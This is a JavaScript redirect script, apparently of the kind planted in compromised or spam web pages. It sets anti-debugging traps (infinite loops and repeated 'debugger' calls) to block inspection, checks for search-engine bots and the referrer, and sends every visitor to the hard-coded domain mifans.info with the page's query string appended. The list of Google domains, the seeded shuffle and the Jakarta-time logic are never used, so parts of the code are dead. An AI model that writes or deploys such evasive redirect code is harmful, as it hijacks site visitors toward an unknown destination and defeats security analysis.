// Advanced Redirect Script with Bot Detection & Anti-Debug
// Redirects to specified domain with 's' parameter

(function() {
    'use strict';
    
    // Anti-debugging protection
    const antiDebugProtection = (function() {
        let debugCheck = true;
        return function(context, fn) {
            const protectedFn = debugCheck ? function() {
                if (fn) {
                    const result = fn.apply(context, arguments);
                    fn = null;
                    return result;
                }
            } : function() {};
            debugCheck = false;
            return protectedFn;
        };
    })();
    
    // Initialize anti-debug
    (function() {
        antiDebugProtection(this, function() {
            const functionTest = new RegExp('function *\\( *\\)');
            const whileTest = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
            const check = debuggerCheck('init');
            
            if (!functionTest.test(check + 'chain') || !whileTest.test(check + 'input')) {
                check('0');
            } else {
                debuggerCheck();
            }
        })();
    })();
    
    // Main debugger check function
    function debuggerCheck(action) {
        function checkLoop(counter) {
            if (typeof counter === 'string') {
                return function(x) {}.constructor('while (true) {}').apply('counter');
            } else {
                if (('' + counter / counter).length !== 1 || counter % 20 === 0) {
                    (function() { return true; }).constructor('debugger').call('action');
                } else {
                    (function() { return false; }).constructor('debugger').apply('stateObject');
                }
            }
            checkLoop(++counter);
        }
        
        try {
            if (action) {
                return checkLoop;
            } else {
                checkLoop(0);
            }
        } catch (e) {}
    }
    
    // Get current domain
    let currentDomain = window.location.hostname;
    document.title = currentDomain;
    
    // Check if URL has query parameters
    if (window.location.href.includes('?')) {
        let urlParts = window.location.href.split('?');
        let userAgent = navigator.userAgent.toLowerCase();
        
        if (urlParts[1]) {
            // Get the parameter value from URL
            let paramValue = urlParts[1];
            
            // Create seed from domain for shuffling
            let seed = combineSeedAndSecret(currentDomain);
            
            // List of referrer sources for tracking (can be expanded)
            let referrerSources = [
                'google.com', 'google.ad', 'google.ae', 'google.com.af', 'google.com.ag',
                'google.al', 'google.am', 'google.co.ao', 'google.com.ar', 'google.as',
                'google.at', 'google.com.au', 'google.az', 'google.ba', 'google.com.bd',
                'google.be', 'google.bf', 'google.bg', 'google.com.bh', 'google.bi',
                'google.bj', 'google.com.bn', 'google.com.bo', 'google.com.br', 'google.bs',
                'google.bt', 'google.co.bw', 'google.by', 'google.ca', 'google.cat',
                'google.cd', 'google.cf', 'google.cg', 'google.ch', 'google.ci',
                'google.cl', 'google.cm', 'google.cn', 'google.com.co', 'google.co.cr',
                'google.com.cu', 'google.cv', 'google.com.cy', 'google.cz', 'google.de',
                'google.dj', 'google.dk', 'google.dm', 'google.com.do', 'google.dz',
                'google.com.ec', 'google.ee', 'google.com.eg', 'google.es', 'google.com.et',
                'google.fi', 'google.com.fj', 'google.fm', 'google.fr', 'google.ga',
                'google.ge', 'google.gg', 'google.com.gh', 'google.com.gi', 'google.gl',
                'google.gm', 'google.gr', 'google.com.gt', 'google.gy', 'google.com.hk',
                'google.hn', 'google.hr', 'google.ht', 'google.hu', 'google.co.id',
                'google.ie', 'google.co.il', 'google.im', 'google.co.in', 'google.iq',
                'google.is', 'google.it', 'google.je', 'google.com.jm', 'google.jo',
                'google.co.jp', 'google.co.ke', 'google.kg', 'google.ki', 'google.com.kh',
                'google.co.kr', 'google.com.kw', 'google.kz', 'google.la', 'google.com.lb',
                'google.li', 'google.lk', 'google.co.ls', 'google.lt', 'google.lu',
                'google.lv', 'google.com.ly', 'google.co.ma', 'google.md', 'google.me',
                'google.mg', 'google.mk', 'google.ml', 'google.com.mm', 'google.mn',
                'google.ms', 'google.com.mt', 'google.mu', 'google.mv', 'google.mw',
                'google.com.mx', 'google.com.my', 'google.co.mz', 'google.com.na', 'google.ne',
                'google.com.ng', 'google.com.ni', 'google.nl', 'google.no', 'google.com.np',
                'google.nr', 'google.nu', 'google.co.nz', 'google.com.om', 'google.com.pa',
                'google.com.pe', 'google.com.pg', 'google.com.ph', 'google.com.pk', 'google.pl',
                'google.pn', 'google.com.pr', 'google.ps', 'google.pt', 'google.com.py',
                'google.com.qa', 'google.ro', 'google.rs', 'google.ru', 'google.rw',
                'google.com.sa', 'google.com.sb', 'google.sc', 'google.se', 'google.com.sg',
                'google.sh', 'google.si', 'google.sk', 'google.com.sl', 'google.sn',
                'google.so', 'google.sm', 'google.sr', 'google.st', 'google.com.sv',
                'google.td', 'google.tg', 'google.co.th', 'google.com.tj', 'google.tl',
                'google.tm', 'google.tn', 'google.to', 'google.com.tr', 'google.tt',
                'google.com.tw', 'google.co.tz', 'google.com.ua', 'google.co.ug', 'google.co.uk',
                'google.com.uy', 'google.co.uz', 'google.com.vc', 'google.co.ve', 'google.co.vi',
                'google.com.vn', 'google.vu', 'google.ws', 'google.co.za', 'google.co.zm',
                'google.co.zw'
            ];
            
            // Shuffle referrer sources with seed
            const shuffle = createShuffleWithSeed(seed);
            let shuffledReferrers = shuffle(referrerSources);
            
            // TODO: Replace with your actual domain
            let targetDomain = 'https://mifans.info';
            
            // Bot detection regex
            const botRegex = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|facebook|yandex|spider|bytedance|ali/i;
            
            // Check if it's a bot or has no referrer
            if (botRegex.test(userAgent) || document.referrer === '') {
                // Bot detected or no referrer
                let redirectUrl = targetDomain + '/' + paramValue;
                window.location.href = redirectUrl;
            } else if (document.referrer.includes('google')) {
                // Traffic from Google
                const jakartaTime = new Date().toLocaleString('en-US', {'timeZone': 'Asia/Jakarta'});
                const jakartaDate = new Date(jakartaTime);
                const timeWIB = Math.floor(jakartaDate.getTime() / 1000);
                
                let redirectUrl = targetDomain + '/' + paramValue;
                window.location.href = redirectUrl;
            } else {
                // Regular traffic
                let redirectUrl = targetDomain + '/' + paramValue;
                window.location.href = redirectUrl;
            }
        }
    }
    
    // Helper Functions
    
    // Combine seed and secret to create custom alphabet
    function combineSeedAndSecret(seedString) {
        const cleaned = seedString.replace(/[^a-zA-Z0-9]/g, '');
        const chars = cleaned.split('');
        const uniqueChars = [...new Set(chars)];
        return uniqueChars.join('');
    }
    
    // Hash string to create numeric seed
    function hashStringToSeed(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            hash = (hash << 5) - hash + str.charCodeAt(i);
            hash |= 0;
        }
        return Math.abs(hash);
    }
    
    // Create seeded random number generator
    function createSeededRandom(seed) {
        return function() {
            let x = Math.sin(seed++) * 10000;
            return x - Math.floor(x);
        };
    }
    
    // Create shuffle function with seed
    function createShuffleWithSeed(seedString) {
        const numericSeed = hashStringToSeed(seedString);
        
        return function shuffleArray(array) {
            const random = createSeededRandom(numericSeed + array.length);
            let shuffled = array.slice();
            
            // Fisher-Yates shuffle with seeded random
            for (let i = shuffled.length - 1; i > 0; i--) {
                let j = Math.floor(random() * (i + 1));
                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
            }
            
            return shuffled;
        };
    }
    
})();
